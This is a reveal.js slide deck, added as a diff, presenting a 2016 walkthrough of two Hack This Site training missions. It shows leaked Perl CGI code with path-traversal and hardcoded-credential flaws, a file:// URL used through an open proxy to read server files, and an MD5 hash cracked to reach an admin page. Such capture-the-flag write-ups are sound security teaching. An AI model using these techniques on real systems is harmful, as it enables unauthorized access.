@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang='en'>
+  <head>
+    <meta content='text/html; charset=UTF-8' http-equiv='Content-Type'>
+    <meta charset='utf-8'>
+    <title>Hack This Site</title>
+    <meta content='yes' name='apple-mobile-web-app-capable'>
+    <meta content='black-translucent' name='apple-mobile-web-app-status-bar-style'>
+    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui' name='viewport'>
+    <link href='../../css/reveal.css' rel='stylesheet'>
+    <link href='../../css/theme/serif.css' id='theme' rel='stylesheet'>
+    <!-- Code syntax highlighting -->
+    <link href='../../lib/css/zenburn.css' rel='stylesheet'>
+    <!-- Printing and PDF exports -->
+    <script>
+      var link = document.createElement( 'link' );
+      link.rel = 'stylesheet';
+      link.type = 'text/css';
+      link.href = window.location.search.match( /print-pdf/gi ) ? '../../css/print/pdf.css' : '../../css/print/paper.css';
+      document.getElementsByTagName( 'head' )[0].appendChild( link );
+    </script>
+    <!--[if lt IE 9]>
+      <script src="../../lib/js/html5shiv.js"></script>
+    <![endif]-->
+  </head>
+  <body>
+    <div class='reveal'>
+      <!-- Any section element inside of this container is displayed as a slide -->
+      <div class='slides'>
+        <section data-markdown data-separator="^\n---\n$" data-separator-vertical="^\n--\n$">
+          <script type="text/template">
+          #Hack This Site
+
+          廖子慶  
+          2016/07/21 <!-- .element: align="right" -->
+
+          ---
+
+          ##Heartland School District
+
+          --
+
+          ###題目
+          ![](./1.jpg)
+
+          --
+
+          ![](./2.jpg)
+
+          --
+
+          ##internet.pl
+
+          ```url
+          view-source:https://www.hackthissite.org/missions/realistic/12/cgi-bin/guest.pl?action=read&file=internet.pl
+          ```
+
+          ```perl
+          #!perl
+          use strict;
+          use URI::Escape;
+
+          my $url = $ENV{'QUERY_STRING'};
+          $url = uri_unescape($url);
+          $url = uri_escape($url);
+          print "Content-type: text/html\r\n\r\n
+          <html><head><title>Heartland School District - Internet Access</title></head>
+          <body bgcolor=\"#cccccc\" text=\"#000000\">
+          <form action=\"internet.pl\" method=\"get\">Address:
+          <input type=\"text\" value=\"http://\" SIZE=40 name=\"url\">
+          <input type=\"submit\" value=\"Go\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+          <a href=\"../\">Heartland School District</a></form>
+          <iframe src=\"page.pl?$url\" width=100% height=90%>This browser doesn\'t support IFRAMES.</iframe>
+          </body></html>";
+          ```
+
+          --
+
+          ##page.pl
+
+          ```url
+          view-source:https://www.hackthissite.org/missions/realistic/12/cgi-bin/guest.pl?action=read&file=page.pl
+          ```
+
+          ```perl
+          
+          #!perl
+
+          use strict;
+          use URI::Escape;
+
+          my $url = $ENV{QUERY_STRING};
+          $url = uri_unescape($url);
+          $url =~ s/^url=//i;
+          if (length($url) == 0 || $url eq "http://" || $url eq "/")
+          {
+           $url = "../main.html";
+          }
+          my $line;
+          open(blocked, "<blocked.txt") or print "Content-Type: text/plain\r\n\r\nFailed to load blocked.txt" and exit;
+          while ($line = <blocked>)
+          {
+           chomp($line);
+            if ($url =~ /$line/i)
+            {
+              print "Content-Type: text/html\r\n\r\n<html><head><title>Blocked</title></head><body bgcolor=\"#000000\" text=\"#ffffff\"><center><table bgcolor=\"#ff0000\" width=\"90%\" height=\"10%\"><tr><td></td></tr></table><br><br><br><br><font size=6>This Page is Blocked<br><font size=4><i>Heartland Technology Department</i><br><br><br><br><table bgcolor=\"#ff0000\" width=\"90%\" height=\"10%\"><tr><td></td></tr></table></center></body></html>" and exit;
+            }
+
+          }
+          close(blocked);
+
+          my $browser = LWP::UserAgent->new(agent => "Bardus Browser v1.0");
+          my $request  = HTTP::Request->new('GET', $url);
+          my $response = $browser->request($request);
+          print "Content-Type: ".$response->content_type."\r\n\r\n".$response->content;
+          ```
+
+          --
+
+          ```url
+          https://www.hackthissite.org/missions/realistic/12/cgi-bin/internet.pl?url=file%3A%2F%2Fc%3A%2Fweb%2Fhtml%2F
+          ```
+
+          ![](./3.jpg)
+
+          --
+
+          ![](./4.jpg)
+
+          ```html
+          <html><head><title>Heartland School District - Administrator Panel</title></head>
+          <body bgcolor="#204090" text="#cccccc" background="back.gif" link="#204090" alink="#204090" vlink="#204090">
+          <form action="cgi-bin/heartlandadminpanel.pl" method=get>
+          username: <input type="text" value="" name="username"><br>
+          password: <input type="password" value="" name="password"><br>
+          <input type="submit" value="submit">
+          </form></body></html>
+          ```
+
+          --
+
+          ##heartlandadminpanel.pl
+
+          ```url
+          view-source:https://www.hackthissite.org/missions/realistic/12/cgi-bin/guest.pl?action=read&file=heartlandadminpanel.pl
+          ```
+
+          ```perl
+          #!perl
+          use strict;
+          print "Content-type: text/html\r\n\r\n";
+          require "db.cgi";
+          my $line;
+
+          if ($ENV{QUERY_STRING} =~ /^username=jbardus&password=heartlandnetworkadministrator&blocked=/)
+          {
+           clearlist();
+          }
+          elsif ($ENV{QUERY_STRING} =~ /^username=jbardus&password=heartlandnetworkadministrator/)
+          {
+           print "<html><head><title>Heartland School District Network Administrator</title></head>
+           <body bgcolor=\"#204090\" text=\"#204090\" background=\"../back.gif\" link=\"#204090\" alink=\"#204090\" vlink=\"#204090\">
+           <div align=\"center\">
+           <form action=\"heartlandadminpanel.pl\" method=get>
+           <input type=\"hidden\" name=\"username\" value=\"jbardus\">
+           <input type=\"hidden\" name=\"password\" value=\"heartlandnetworkadministrator\">
+           <input type=\"hidden\" name=\"blocked\" value=\"\">
+           <select multiple name=\"blocked\" size=15 style=\"width:400px;\">";
+           open(file, "blocked.txt") or print "Failed to load blocked.txt";
+           while ($line = <file>)
+           {
+            chomp($line);
+            print "<option>$line</option>\n";
+           }
+           close(file);
+           print "</select><br><br>
+           <input type=\"button\" value=\"add site\"> 
+           <input type=\"button\" value=\"edit\"> 
+           <input type=\"button\" value=\"delete\">
+           <input type=\"submit\" value=\"clear all\">
+           </form></div></body></html>";
+          }
+          else
+          {
+           print "Invalid Username / Password";
+          }
+          ```
+
+          --
+
+          ![](./5.jpg)
+
+          --
+
+          ![](./6.jpg)
+
+          --
+
+          ## Path Traversal
+
+          ### guest.pl
+
+          ```perl
+          #!perl
+          use strict;
+          use URI::Escape;
+          print "Content-type: text/html\r\n\r\n";
+
+          my @args = split(/\&/, $ENV{'QUERY_STRING'});
+          my ($arg, $action, $file, $text, $line);
+
+          foreach $arg (@args)
+          {
+           if ($arg =~ /^action=/)
+           {
+            $action = $arg;
+            $action =~ s/^action=//g;
+           }
+           if ($arg =~ /^text=/)
+           {
+            $text = $arg;
+            $text =~ s/^text=//g;
+            $text = uri_unescape($text);
+            $text =~ s/&/&amp;/g;
+            $text =~ s/</&lt;/g;
+            $text =~ s/>/&gt;/g;
+           }
+           if ($arg =~ /^file=/)
+           {
+            $file = $arg;
+            $file =~ s/^file=//g;
+            if ($file =~ /\.\./ | $file =~ /^\//)
+            {
+             print "Access denied." and exit;
+            }
+            $file = uri_unescape($file);
+            $file =~ s/<|>|\||\&|;//g;
+           }
+          }
+
+          if ($action eq "read")
+          {
+           open(file, "<$file") or print "File not found." and exit;
+           while ($line = <file>)
+           {
+            print $line;
+           }
+           close(file);
+          }
+
+          if ($action eq "write")
+          {
+           open(file, ">>guestbook.txt") or print "Failed to append to guestbook.txt" and exit;
+           print file "$text<br><hr>\n";
+           close(file);
+           print "<meta http-equiv=\"refresh\" content=\"0;url=guest.pl?action=read&file=guestbook.txt\">";
+          }
+          ```
+
+          ---
+
+          ##Elbonian Republican Party
+
+          --
+
+          ##題目
+          ![](./2-0.jpg) <!-- .element: width="70%" -->
+
+          --
+
+          ![](./2-1.jpg)<!-- .element: width="70%" -->
+
+          --
+
+          ![](./2-2.jpg)
+
+          --
+
+          ```url
+          https://www.hackthissite.org/missions/realistic/13/speeches/passwords/7e40c181f9221f9c613adf8bb8136ea8/
+          ```
+
+          ![](./2-3.jpg)
+
+          ```
+          7bc35830abab8fced52657d38ea048df:21232f297a57a5a743894a0e4a801fc3
+          ```
+
+          --
+
+          ![](./2-4.jpg) <!-- .element: width="50%" -->
+
+          ```
+          moni1:admin
+          ```
+
+          --
+
+          ```url
+          https://www.hackthissite.org/missions/realistic/13/MD5('admin')
+          ```
+
+          ![](./2-5.jpg)
+
+          --
+
+          ![](./2-6.jpg)
+
+          --
+
+          #資安議題
+
+          * Hash != Safe
+          * Admin Page Access Contorl
+
+          ---
+
+          #END
+
+          </script>
+        </section>
+      </div>
+    </div>
+    <script src='../../lib/js/head.min.js'></script>
+    <script src='../../js/reveal.js'></script>
+    <script>
+      // Full list of configuration options available at:
+      // https://github.com/hakimel/reveal.js#configuration
+      Reveal.initialize({
+      	controls: true,
+        progress: true,
+        history: true,
+        slideNumber: true,
+        center: true,
+        keyboard: true,
+        overview: true,
+
+        // The "normal" size of the presentation, aspect ratio will be preserved
+        // when the presentation is scaled to fit different resolutions. Can be
+        // specified using percentage units.
+        width: 1024,
+        height: 768,
+        // Bounds for smallest/largest possible scale to apply to content
+        minScale: 0.1,
+        maxScale: 1.0,
+
+      	transition: 'convex', // none/fade/slide/convex/concave/zoom
+
+      	// Optional reveal.js plugins
+      	dependencies: [
+      		{ src: '../../lib/js/classList.js', condition: function() { return !document.body.classList; } },
+      		{ src: '../../plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+      		{ src: '../../plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+            { src: '../../plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+      		{ src: '../../plugin/zoom-js/zoom.js', async: true },
+      		{ src: '../../plugin/notes/notes.js', async: true }
+      	]
+      });
+    </script>
+  </body>
+</html>
